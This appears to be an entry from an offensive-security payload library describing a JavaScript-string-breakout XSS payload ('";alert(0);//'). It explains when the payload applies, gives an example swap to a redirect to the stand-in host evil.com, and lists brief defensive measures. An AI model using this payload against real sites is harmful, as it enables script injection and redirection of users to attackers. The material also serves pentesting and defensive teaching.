---
id: 0c73ffb9-4d76-465d-bd87-41582375bc43
type: code
language: javascript
verified: true
created_at: '2023-04-06T03:56:31.798818+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Web
tags:
  - xss
  - injection
validated: true
---

# JavaScript-Variable-XSS-Payload

## Code

```javascript
";alert(0);//
```

## Description

Closes a JS string var and injects code, useful if redirect param reflects in script.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| alert(0) | Executable JS | document.location='evil.com' |

## Usage

If var x = "PARAM"; use to break out and execute.

## Detection

- Escape quotes in JS contexts.
- Use DOM-based XSS protections.

## Related

- [[procedures/Bypass-Open-URL-Redirection-Filters]]
